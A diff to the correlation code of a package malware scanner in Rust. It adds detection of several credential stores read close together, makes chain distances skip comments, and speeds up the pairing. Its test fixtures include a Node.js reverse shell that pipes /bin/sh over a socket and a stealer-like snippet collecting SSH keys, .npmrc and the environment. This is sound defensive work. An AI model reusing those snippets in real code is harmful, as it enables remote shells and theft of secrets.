@@ -17,7 +17,7 @@ use crate::scanner::{
 };
 use crate::RuleMatch;
 use regex::Regex;
-use std::collections::{BTreeMap, HashSet};
+use std::collections::{BTreeMap, HashMap, HashSet};
 use std::path::Path;
 use std::sync::LazyLock;
 
@@ -59,6 +59,10 @@ pub const ACCESS_TUNNEL_DROP: &str = "Chain: Dropped Binary Behind a Cloudflare 
 pub const WEB_PAGE_PACKAGE: &str = "Chain: Web Page Published as a Package";
 /// Emitted by `cve::own_package_matches` for versions like 99.0.0 / 999.9.9.
 pub const DEP_CONFUSION_VERSION: &str = "Dependency Confusion Version";
+/// Three kinds of credential store read close together in one file. Not a
+/// chain and `low`: on record, and no weight in a verdict until its rate on
+/// clean packages is measured.
+pub const CREDENTIAL_SWEEP: &str = "Several Kinds of Credential Store Read";
 
 /// Reads that only a stealer needs: browser stores, wallets, tokens, keys.
 const STRONG_SOURCES: &[&str] = &[
@@ -79,6 +83,96 @@ const WEAK_SOURCES: &[&str] = &[
     "SSH Key Access",
     SEED_ACCESS,
 ];
+
+const ENV_READ: &str = "Environment Variable Dump";
+
+/// The rules that are a read of a credential store, one kind per line. A kind
+/// is where a secret sits, not whose it is: three browsers are one kind, and
+/// so are the tokens of three cloud providers read from the environment.
+/// Not `SEED_ACCESS`: `privateKey:` is an option of every SSH client, beside
+/// the key path. A Discord token path matches the profile rule too.
+const CREDENTIAL_KINDS: &[(&str, &[&str])] = &[
+    (
+        "browser or Discord profile",
+        &[
+            "Browser Profile Access",
+            "Browser Database Access",
+            "Discord Token Harvesting",
+            "Browser Extension Cookie/Token Theft",
+        ],
+    ),
+    ("wallet", &["Crypto Wallet Access"]),
+    ("SSH keys", &["SSH Key Access"]),
+    ("credential files", &["Password Manager Access"]),
+    ("editor session", &["VS Code Session/Token Stealing"]),
+    ("environment", &[ENV_READ]),
+];
+
+/// Kinds that make a sweep: two are a deploy script (`.env` and an SSH key).
+const SWEEP_KINDS: usize = 3;
+
+/// One variable read by its name: `process.env.HOME`, `os.environ["PATH"]`,
+/// `getenv("USER")`. The whole mapping and a name built at run time are not.
+static ENV_NAME: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(
+        r#"^(?:process\.env|os\.environ|getenv)(?:\?\.|\.get\s*\(|[.\[(])\s*["'`]?([A-Z][A-Z0-9_]*)(?-u:\b)"#,
+    )
+    .unwrap()
+});
+
+/// What the variable of a secret is called (`NPM_TOKEN`, `AWS_SECRET_ACCESS_KEY`).
+const SECRET_WORDS: &[&str] = &["TOKEN", "SECRET", "KEY", "PASS", "CREDENTIAL"];
+
+/// Whether the environment read at `at` is of one variable that is no
+/// secret by its name: a setting, which every program reads.
+fn reads_a_setting(content: &str, at: usize) -> bool {
+    content
+        .get(at..)
+        .and_then(|rest| ENV_NAME.captures(rest))
+        .is_some_and(|c| !SECRET_WORDS.iter().any(|w| c[1].contains(w)))
+}
+
+/// The first read of each kind in the first `NEAR` bytes of the file that
+/// hold `SWEEP_KINDS` kinds of credential store.
+fn credential_sweep<'a>(
+    content: &str,
+    file_matches: &'a [RuleMatch],
+    offsets: &[usize],
+) -> Option<Vec<(&'static str, &'a RuleMatch)>> {
+    let mut reads: Vec<(usize, usize, &RuleMatch)> = file_matches
+        .iter()
+        .enumerate()
+        .filter_map(|(i, m)| {
+            let name = m.matched_pattern.as_str();
+            let kind = CREDENTIAL_KINDS
+                .iter()
+                .position(|(_, rules)| rules.contains(&name))?;
+            let at = offsets.get(i).copied().unwrap_or(0);
+            (name != ENV_READ || !reads_a_setting(content, at)).then_some((at, kind, m))
+        })
+        .collect();
+    reads.sort_by_key(|(at, ..)| *at);
+    let mut count = [0usize; CREDENTIAL_KINDS.len()];
+    let mut lo = 0;
+    for (hi, &(at, kind, _)) in reads.iter().enumerate() {
+        count[kind] += 1;
+        while at - reads[lo].0 > NEAR {
+            count[reads[lo].1] -= 1;
+            lo += 1;
+        }
+        if count.iter().filter(|n| **n > 0).count() >= SWEEP_KINDS {
+            let mut firsts: Vec<(&str, &RuleMatch)> = Vec::new();
+            for &(_, kind, m) in &reads[lo..=hi] {
+                let kind = CREDENTIAL_KINDS[kind].0;
+                if !firsts.iter().any(|(seen, _)| *seen == kind) {
+                    firsts.push((kind, m));
+                }
+            }
+            return Some(firsts);
+        }
+    }
+    None
+}
 
 /// Channels that exist mainly to receive stolen data.
 const HARD_SINKS: &[&str] = &[
@@ -190,13 +284,79 @@ static AGENT_HARM: LazyLock<Regex> = LazyLock::new(|| {
     .unwrap()
 });
 
-/// Chain parts must sit this close (bytes). Bundlers put a whole extension in
-/// one file, so "same file" alone paired a socket in one module with a
-/// child_process in another (Remote Containers, Ansible).
+/// Chain parts must sit this close (bytes, comments left out). Bundlers put a
+/// whole extension in one file, so "same file" alone paired a socket in one
+/// module with a child_process in another (Remote Containers, Ansible).
 pub(crate) const NEAR: usize = 4096;
+
+/// The comments of `content` as (start, end, comment bytes before `start`):
+/// lines that hold only a `//` or `#` comment, and `/* … */` blocks that open
+/// a line. Whatever the language: a `#private` field or a shebang read as a
+/// comment shortens a distance by one line.
+// shortcut: a block comment after code on its line, a docstring and `<!-- -->` still count as distance (`/*` inside a line is a glob as often as a comment), upgrade to a tokenizer per language when a sample hides behind one.
+fn comment_spans(content: &str) -> Vec<(usize, usize, usize)> {
+    let mut spans = Vec::new();
+    let (mut pos, mut skipped) = (0, 0);
+    // No `*/` after one `/*` is none after the next: 400,000 lines of `/*`
+    // would each be a search to the end of the file.
+    let mut closes = true;
+    while pos < content.len() {
+        let line_end = content[pos..]
+            .find('\n')
+            .map_or(content.len(), |i| pos + i + 1);
+        let text = content[pos..line_end].trim_start();
+        let end = if text.starts_with("//") || text.starts_with('#') {
+            Some(line_end)
+        } else if closes && text.starts_with("/*") {
+            let open = line_end - text.len() + 2;
+            let end = content[open..].find("*/").map(|i| open + i + 2);
+            closes = end.is_some();
+            end
+        } else {
+            None
+        };
+        if let Some(end) = end {
+            spans.push((pos, end, skipped));
+            skipped += end - pos;
+        }
+        // After a block, what is left of its last line is read as a line.
+        pos = end.unwrap_or(line_end);
+    }
+    spans
+}
+
+/// `at` with the comment bytes before it left out.
+fn code_offset(comments: &[(usize, usize, usize)], at: usize) -> usize {
+    match comments.partition_point(|c| c.0 < at).checked_sub(1) {
+        Some(i) => {
+            let (start, end, before) = comments[i];
+            at - before - (at.min(end) - start)
+        }
+        None => at,
+    }
+}
 
 /// Lines between a host-name read and a hardcoded IP that make one beacon.
 const IP_LINES: usize = 200;
+
+/// Whether one of `sorted` lies within `reach` of `at`, by binary search.
+fn within(sorted: &[usize], at: usize, reach: usize) -> bool {
+    let i = sorted.partition_point(|&o| o < at.saturating_sub(reach));
+    sorted.get(i).is_some_and(|&o| o.abs_diff(at) <= reach)
+}
+
+/// Indices of the first (a, b) pair within `reach` of each other: the first
+/// `a` in the order given that has a `b` that close, and the first such `b`.
+/// Comparing every `a` with every `b` is quadratic: 200,000 sockets in one
+/// half of a file and 200,000 `exec(` in the other never pair, after
+/// 40,000,000,000 comparisons.
+fn first_pair(a: &[usize], b: &[usize], reach: usize) -> Option<(usize, usize)> {
+    let mut sorted = b.to_vec();
+    sorted.sort_unstable();
+    let i = a.iter().position(|&at| within(&sorted, at, reach))?;
+    let j = b.iter().position(|&to| a[i].abs_diff(to) <= reach)?;
+    Some((i, j))
+}
 
 /// Tunnel services that are also products people build on and name in code.
 const TUNNEL_HOSTS: &[&str] = &[
@@ -237,14 +397,20 @@ pub fn correlate_file(
             .map(|(i, m)| (offsets.get(i).copied().unwrap_or(0), m))
             .collect()
     };
-    // First (a, b) pair within NEAR bytes of each other.
+    // Read only when a chain has both of its parts in the file.
+    let comments = std::cell::LazyCell::new(|| comment_spans(content));
+    // First (a, b) pair within NEAR bytes of code of each other.
     let near = |a: &[&str], b: &[&str]| -> Option<(usize, &RuleMatch, &RuleMatch)> {
-        let bs = indexed(b);
-        indexed(a).into_iter().find_map(|(oa, ma)| {
-            bs.iter()
-                .find(|(ob, _)| oa.abs_diff(*ob) <= NEAR)
-                .map(|(_, mb)| (oa, ma, *mb))
-        })
+        let (a, b) = (indexed(a), indexed(b));
+        if a.is_empty() || b.is_empty() {
+            return None;
+        }
+        let at = |hits: &[(usize, &RuleMatch)]| {
+            hits.iter()
+                .map(|(o, _)| code_offset(&comments, *o))
+                .collect::<Vec<_>>()
+        };
+        first_pair(&at(&a), &at(&b), NEAR).map(|(i, j)| (a[i].0, a[i].1, b[j].1))
     };
     let mut out = Vec::new();
 
@@ -260,7 +426,17 @@ pub fn correlate_file(
     }
 
     if let Some((at, sock, ex)) = near(&[RAW_SOCKET], EXECUTORS) {
-        if SHELL_PIPE.is_match(around(content, at)) {
+        // Beside the socket or a process start near it in code: a comment
+        // between the two puts the pipe out of the socket's window and
+        // leaves it next to the shell, which need not be the start paired.
+        let piped = |at| SHELL_PIPE.is_match(around(content, at));
+        let sock_at = code_offset(&comments, at);
+        let at_shell = || {
+            indexed(EXECUTORS)
+                .iter()
+                .any(|(o, _)| code_offset(&comments, *o).abs_diff(sock_at) <= NEAR && piped(*o))
+        };
+        if piped(at) || at_shell() {
             out.push(chain(rel_path, REVERSE_SHELL, sock, ex));
         }
     }
@@ -423,6 +599,21 @@ pub fn correlate_file(
         &["Mass File Encryption", "Encrypted File Extension"],
     ) {
         out.push(chain(rel_path, RANSOMWARE, note, enc));
+    }
+
+    // A stealer sweeps every store it knows; a tool reads the one it is for.
+    if let Some(reads) = credential_sweep(content, file_matches, offsets) {
+        out.push(RuleMatch {
+            file_path: rel_path.to_string(),
+            line_number: reads[0].1.line_number,
+            matched_pattern: CREDENTIAL_SWEEP.to_string(),
+            severity: "low".to_string(),
+            context: reads
+                .iter()
+                .map(|(kind, m)| format!("{kind}: {} (line {})", m.matched_pattern, m.line_number))
+                .collect::<Vec<_>>()
+                .join(" + "),
+        });
     }
 
     if has(&[ARCHIVE_EXTRACTION]).is_some() {
@@ -688,6 +879,16 @@ fn correlate_unit(all: &[&RuleMatch], hooks_run: bool) -> Vec<RuleMatch> {
             .copied()
             .find(|m| names.contains(&m.matched_pattern.as_str()))
     };
+    // The first hit of `name` in each file, looked up by file: going through
+    // the unit's hits once more for each of them is quadratic, and one file
+    // of a repeated line brings 400,000.
+    let first_in_file = |name: &str| {
+        let mut by_file: HashMap<&str, &RuleMatch> = HashMap::new();
+        for m in matches.iter().filter(|m| m.matched_pattern == name) {
+            by_file.entry(m.file_path.as_str()).or_insert(*m);
+        }
+        by_file
+    };
     // What an install script can reach. CI and infra YAML is the author's
     // pipeline: a `curl … .EXE` in circle.yml never runs at `npm install`
     // (sapnwrfc).
@@ -788,14 +989,16 @@ fn correlate_unit(all: &[&RuleMatch], hooks_run: bool) -> Vec<RuleMatch> {
     // the setup.py rules has to be in the file: the scanner reports those
     // only where `setup(` is called.
     if hooks_run {
-        let is_script = |file: &str| {
-            file.matches(['/', '\\']).count() <= 1
-                || all.iter().any(|h| {
-                    h.file_path == file
-                        && [INSTALL_HOOK_OVERRIDE, SETUP_PY_EXEC, SETUP_PY_STAGER]
-                            .contains(&h.matched_pattern.as_str())
-                })
-        };
+        let with_setup_rule: HashSet<&str> = all
+            .iter()
+            .filter(|h| {
+                [INSTALL_HOOK_OVERRIDE, SETUP_PY_EXEC, SETUP_PY_STAGER]
+                    .contains(&h.matched_pattern.as_str())
+            })
+            .map(|h| h.file_path.as_str())
+            .collect();
+        let is_script =
+            |file: &str| file.matches(['/', '\\']).count() <= 1 || with_setup_rule.contains(file);
         let in_setup = |names: &[&str]| {
             all.iter().copied().find(|m| {
                 Path::new(&m.file_path).file_name() == Some("setup.py".as_ref())
@@ -838,54 +1041,65 @@ fn correlate_unit(all: &[&RuleMatch], hooks_run: bool) -> Vec<RuleMatch> {
     // servers far from an unrelated hostname (uix: an export file's
     // `os.hostname()` 3,400 lines below its intranet API config).
     let ip_near = || {
+        let mut ip_lines: HashMap<&str, Vec<usize>> = HashMap::new();
+        for m in matches.iter().filter(|m| m.matched_pattern == IP_URL) {
+            ip_lines
+                .entry(m.file_path.as_str())
+                .or_default()
+                .push(m.line_number);
+        }
+        ip_lines
+            .values_mut()
+            .for_each(|lines| lines.sort_unstable());
+        let recon = matches.iter().copied().find(|r| {
+            r.matched_pattern == HOST_RECON
+                && ip_lines
+                    .get(r.file_path.as_str())
+                    .is_some_and(|lines| within(lines, r.line_number, IP_LINES))
+        })?;
         matches
             .iter()
             .copied()
-            .filter(|m| m.matched_pattern == HOST_RECON)
-            .find_map(|r| {
-                matches
-                    .iter()
-                    .copied()
-                    .find(|m| {
-                        m.matched_pattern == IP_URL
-                            && m.file_path == r.file_path
-                            && m.line_number.abs_diff(r.line_number) <= IP_LINES
-                    })
-                    .map(|ip| (r, ip))
+            .find(|m| {
+                m.matched_pattern == IP_URL
+                    && m.file_path == recon.file_path
+                    && m.line_number.abs_diff(recon.line_number) <= IP_LINES
             })
+            .map(|ip| (recon, ip))
     };
     // First (a, b) pair inside one file. Two medium "mention" rules anywhere
     // in a package are a help text and a telemetry module.
     let same_file = |a: &str, b: &str| {
-        let named = |name: &str| {
-            matches
-                .iter()
-                .copied()
-                .filter(move |m| m.matched_pattern == name)
-                .collect::<Vec<_>>()
-        };
-        let bs = named(b);
-        named(a).into_iter().find_map(|x| {
-            bs.iter()
-                .find(|y| y.file_path == x.file_path)
-                .map(|y| (x, *y))
-        })
+        let bs = first_in_file(b);
+        matches
+            .iter()
+            .copied()
+            .filter(|x| x.matched_pattern == a)
+            .find_map(|x| bs.get(x.file_path.as_str()).map(|y| (x, *y)))
     };
     // A tunnel product's endpoint (a CLI that opens cloudflared tunnels) or
     // one of three or more such hosts in a file (a blocklist) is a mention
     // too. A capture service or an attacker's token is not.
+    let mut listed: HashMap<&str, HashSet<String>> = HashMap::new();
+    for o in matches
+        .iter()
+        .filter(|o| o.matched_pattern == EXFIL_SERVICE)
+    {
+        let host = matched_text(o).to_ascii_lowercase();
+        if !host.is_empty() {
+            listed.entry(o.file_path.as_str()).or_default().insert(host);
+        }
+    }
     let mention = |m: &RuleMatch| {
-        let listed: HashSet<String> = matches
-            .iter()
-            .filter(|o| o.matched_pattern == EXFIL_SERVICE && o.file_path == m.file_path)
-            .map(|o| matched_text(o).to_ascii_lowercase())
-            .filter(|host| !host.is_empty())
-            .collect();
         let host = matched_text(m).to_ascii_lowercase();
         m.matched_pattern == EXFIL_SERVICE
-            && (listed.len() >= 3 || TUNNEL_HOSTS.iter().any(|t| host.contains(t)))
+            && (listed
+                .get(m.file_path.as_str())
+                .is_some_and(|hosts| hosts.len() >= 3)
+                || TUNNEL_HOSTS.iter().any(|t| host.contains(t)))
     };
     if let Some(recon) = first(&[HOST_RECON]) {
+        let recon_in = first_in_file(HOST_RECON);
         let beacon = matches
             .iter()
             .copied()
@@ -904,11 +1118,7 @@ fn correlate_unit(all: &[&RuleMatch], hooks_run: bool) -> Vec<RuleMatch> {
                 if !mention(sink) {
                     return Some((recon, sink));
                 }
-                matches
-                    .iter()
-                    .copied()
-                    .find(|r| r.matched_pattern == HOST_RECON && r.file_path == sink.file_path)
-                    .map(|r| (r, sink))
+                recon_in.get(sink.file_path.as_str()).map(|r| (*r, sink))
             })
             .or_else(ip_near)
             .or_else(|| {
@@ -984,7 +1194,7 @@ const MAX_REDIRECT_SCRIPTS: usize = 3;
 /// (`redirect-p8ris1`, `1uniswapinterface`). No single line in them is
 /// malicious, so no rule fires; the shape of the package is the finding.
 pub fn redirect_package(root: &Path) -> Option<RuleMatch> {
-    let manifest = std::fs::read_to_string(root.join("package.json")).ok()?;
+    let manifest = crate::cve::read_manifest(root, "package.json")?;
     let manifest: serde_json::Value = serde_json::from_str(&manifest).ok()?;
     let has_deps = manifest["dependencies"]
         .as_object()
@@ -1042,7 +1252,7 @@ pub fn redirect_package(root: &Path) -> Option<RuleMatch> {
 /// `opencode-ai` / `opencode-linux-x64`). The binary is the payload, so the
 /// mismatch is all a scan of the package can see.
 pub fn foreign_binary(root: &Path) -> Option<RuleMatch> {
-    let text = std::fs::read_to_string(root.join("package.json")).ok()?;
+    let text = crate::cve::read_manifest(root, "package.json")?;
     let manifest: serde_json::Value = serde_json::from_str(&text).ok()?;
     let scripts = manifest["scripts"].as_object()?;
     let hook = ["preinstall", "install", "postinstall"]
@@ -1336,6 +1546,57 @@ mod tests {
 
     fn names(out: &[RuleMatch]) -> Vec<&str> {
         out.iter().map(|m| m.matched_pattern.as_str()).collect()
+    }
+
+    #[test]
+    fn sorted_pairing_answers_as_comparing_every_pair_did() {
+        // The pairing as it was: every `a` against every `b`, in list order.
+        let pairwise = |a: &[usize], b: &[usize]| {
+            a.iter().enumerate().find_map(|(i, &oa)| {
+                b.iter()
+                    .position(|&ob| oa.abs_diff(ob) <= NEAR)
+                    .map(|j| (i, j))
+            })
+        };
+        let lists: &[(&[usize], &[usize])] = &[
+            (&[], &[]),
+            (&[10], &[]),
+            (&[], &[10]),
+            // Exactly NEAR apart pairs, one byte more does not, on both sides.
+            (&[0], &[NEAR]),
+            (&[0], &[NEAR + 1]),
+            (&[NEAR], &[0]),
+            (&[NEAR + 1], &[0]),
+            (&[10_000], &[10_000 - NEAR - 1, 10_000 + NEAR + 1]),
+            (&[10_000], &[10_000 + NEAR + 1, 10_000 - NEAR]),
+            // The first `a` in list order wins, not the lowest offset, and
+            // of its `b`s the first in list order, not the nearest.
+            (&[50_000, 9_000, 100], &[9_100, 8_000, 9_000, 120, 50_000]),
+            (&[100, 100, 100], &[4_000, 100, 100]),
+            // Decoys far from every partner on both sides of the one pair.
+            (
+                &[0, 20_000, 40_000, 60_000, 80_000],
+                &[10_000, 30_000, 50_000, 64_096, 70_000, 90_000],
+            ),
+            (&[0, 20_000, 40_000], &[10_000, 30_000, 50_000]),
+        ];
+        for (a, b) in lists {
+            assert_eq!(first_pair(a, b, NEAR), pairwise(a, b), "{a:?} {b:?}");
+            assert_eq!(first_pair(b, a, NEAR), pairwise(b, a), "{b:?} {a:?}");
+        }
+        assert_eq!(first_pair(&[0], &[NEAR], NEAR), Some((0, 0)));
+        assert_eq!(first_pair(&[0], &[NEAR + 1], NEAR), None);
+
+        // Through the chain itself: the answer far from the first decoys.
+        let m = [
+            hit("a.js", "eval() Usage", 1),
+            hit("a.js", DNS_TXT, 2),
+            hit("a.js", "eval() Usage", 3),
+        ];
+        let out = correlate_file("a.js", "", &m, &[0, 50_000, 50_000 + NEAR]);
+        assert_eq!(names(&out), vec![DNS_TUNNEL_EXEC]);
+        assert!(out[0].context.ends_with("eval() Usage (line 3)"), "{out:?}");
+        assert!(correlate_file("a.js", "", &m, &[0, 50_000, 50_001 + NEAR]).is_empty());
     }
 
     #[test]
@@ -2214,6 +2475,175 @@ mod tests {
             names(&correlate_file("x.js", close, &m, &[10, 40])),
             vec![REVERSE_SHELL]
         );
+    }
+
+    #[test]
+    fn comments_between_chain_parts_are_not_distance() {
+        let m = [hit("a.js", DNS_TXT, 1), hit("a.js", "eval() Usage", 3)];
+        let pair = |gap: &str| {
+            assert!(gap.len() > NEAR);
+            let content = format!("dns.resolveTxt(host, cb);\n{gap}  eval(txt);\n");
+            let at = content.rfind("eval(").unwrap();
+            names(&correlate_file("a.js", &content, &m, &[0, at])) == [DNS_TUNNEL_EXEC]
+        };
+        // 6 KB of comment between two statements: `//` lines, a block, `#` lines.
+        for gap in [
+            "  // padding padding\n".repeat(300),
+            format!(
+                "  /*\n{}   */ /* more */\n",
+                "   * padding padding\n".repeat(300)
+            ),
+            "# padding padding\n".repeat(350),
+        ] {
+            assert!(pair(&gap), "{}", &gap[..24]);
+        }
+        // Code with a comment after it is code, and so is a glob in a string.
+        assert!(!pair(&"x = x + 1; // padding\n".repeat(300)));
+        assert!(!pair(&format!(
+            "g = 'src/*';\n{}h = '*/x';\n",
+            "x += 1;\n".repeat(600)
+        )));
+        // Two functions far apart in code stay apart, whatever is commented between.
+        let split = format!(
+            "{}{}{}",
+            "x += 1;\n".repeat(300),
+            "// padding\n".repeat(300),
+            "x += 1;\n".repeat(300)
+        );
+        assert!(!pair(&split));
+        // A block comment that never closes is not a comment.
+        assert!(!pair(&"/* open\nx += 1;\n".repeat(400)));
+    }
+
+    #[test]
+    fn a_comment_between_socket_and_shell_keeps_the_reverse_shell() {
+        // The process start paired with the socket is the `require` above
+        // it; the pipe is next to the spawn, past the comment.
+        let pad = format!("// {}\n", "x".repeat(6000));
+        let content = format!(
+            "const cp = require('child_process');\nconst c = new net.Socket();\n{pad}c.connect(4444, h, () => {{\n  const sh = cp.spawn('/bin/sh', []);\n  c.pipe(sh.stdin); sh.stdout.pipe(c);\n}});\n"
+        );
+        let m = [
+            hit("a.js", "child_process (Node.js)", 1),
+            hit("a.js", RAW_SOCKET, 2),
+            hit("a.js", "child_process (Node.js)", 5),
+        ];
+        let at = |s: &str| content.find(s).unwrap();
+        assert_eq!(
+            names(&correlate_file(
+                "a.js",
+                &content,
+                &m,
+                &[at("require"), at("new net"), at("cp.spawn")]
+            )),
+            vec![REVERSE_SHELL]
+        );
+        // Without the pipe it is a socket and a process start, no chain.
+        let quiet = content.replace("c.pipe(sh.stdin); sh.stdout.pipe(c);", "log(1);");
+        let at = |s: &str| quiet.find(s).unwrap();
+        assert!(names(&correlate_file(
+            "a.js",
+            &quiet,
+            &m,
+            &[at("require"), at("new net"), at("cp.spawn")]
+        ))
+        .is_empty());
+    }
+
+    #[test]
+    fn three_kinds_of_credential_store_close_together_is_a_sweep() {
+        let m = [
+            hit("s.js", "SSH Key Access", 2),
+            hit("s.js", "Password Manager Access", 3),
+            hit("s.js", "Password Manager Access", 4),
+            hit("s.js", "Crypto Wallet Access", 5),
+        ];
+        let out = correlate_file("s.js", "", &m, &[10, 60, 90, 10 + NEAR]);
+        assert_eq!(names(&out), vec![CREDENTIAL_SWEEP]);
+        assert_eq!(out[0].severity, "low");
+        assert_eq!(out[0].line_number, 2);
+        assert_eq!(
+            out[0].context,
+            "SSH keys: SSH Key Access (line 2) + credential files: Password Manager Access \
+             (line 3) + wallet: Crypto Wallet Access (line 5)"
+        );
+        // The third kind further on is another module of a bundle.
+        assert!(correlate_file("b.js", "", &m, &[10, 60, 90, 11 + NEAR]).is_empty());
+        // Two kinds, however often; three browsers and Discord are one kind.
+        assert!(correlate_file("s.js", "", &m[..3], &[]).is_empty());
+        let stores = [
+            hit("p.js", "Browser Profile Access", 1),
+            hit("p.js", "Browser Database Access", 2),
+            hit("p.js", "Discord Token Harvesting", 3),
+            hit("p.js", "SSH Key Access", 4),
+            hit("p.js", SEED_ACCESS, 5),
+        ];
+        assert!(correlate_file("p.js", "", &stores, &[]).is_empty());
+    }
+
+    #[test]
+    fn a_setting_read_from_the_environment_is_not_a_credential_read() {
+        for setting in [
+            "process.env.HOME + '/.ssh'",
+            "process.env?.NODE_ENV",
+            "process.env['USERPROFILE']",
+            "os.environ[\"PATH\"]",
+            "os.environ.get('USER')",
+            "getenv(\"HOME\")",
+        ] {
+            assert!(reads_a_setting(setting, 0), "{setting}");
+        }
+        for secret in [
+            "process.env.NPM_TOKEN",
+            "os.environ['AWS_SECRET_ACCESS_KEY']",
+            "getenv(\"PGPASSWORD\")",
+            "process.env)",
+            "os.environ.items()",
+            "process.env[name]",
+        ] {
+            assert!(!reads_a_setting(secret, 0), "{secret}");
+        }
+    }
+
+    /// The sweep on what the rules report for real files.
+    #[test]
+    fn a_sweep_is_reported_for_a_stealer_and_not_for_tools() {
+        let dir = tempfile::tempdir().unwrap();
+        let write = |name: &str, text: &str| std::fs::write(dir.path().join(name), text).unwrap();
+        write(
+            "collect.js",
+            "const home = require('os').homedir();\nconst read = (p) => require('fs').readFileSync(home + p, 'utf8');\nconst loot = {\n  ssh: read('/.ssh/id_rsa'),\n  npm: read('/.npmrc'),\n  env: JSON.stringify(process.env),\n};\n",
+        );
+        // One kind three times.
+        write(
+            "keys.js",
+            "const home = require('os').homedir();\nfor (const k of ['id_rsa', 'id_dsa', 'known_hosts']) load(home + '/.ssh/' + k);\n",
+        );
+        // Two kinds and the home directory from the environment.
+        write(
+            "deploy.js",
+            "require('dotenv').config({ path: '.env' });\nconst key = process.env.HOME + '/.ssh/id_rsa';\nconst mode = process.env.NODE_ENV;\n",
+        );
+        // A cloud SDK's credential chain: three providers, the environment
+        // and files no rule names.
+        write(
+            "providers.js",
+            "const { join } = require('path');\nconst home = require('os').homedir();\nconst aws = { id: process.env.AWS_ACCESS_KEY_ID, secret: process.env.AWS_SECRET_ACCESS_KEY, file: join(home, '.aws', 'credentials') };\nconst gcp = process.env.GOOGLE_APPLICATION_CREDENTIALS || join(home, '.config/gcloud/application_default_credentials.json');\nconst azure = { secret: process.env.AZURE_CLIENT_SECRET, file: join(home, '.azure/accessTokens.json') };\n",
+        );
+        let found = crate::scanner::scan_directory_filtered(
+            dir.path(),
+            None,
+            &[],
+            None,
+            crate::scanner::Tree::Package,
+        )
+        .2;
+        let swept: Vec<&str> = found
+            .iter()
+            .filter(|m| m.matched_pattern == CREDENTIAL_SWEEP)
+            .map(|m| m.file_path.as_str())
+            .collect();
+        assert_eq!(swept, ["collect.js"], "{found:?}");
     }
 
     #[test]
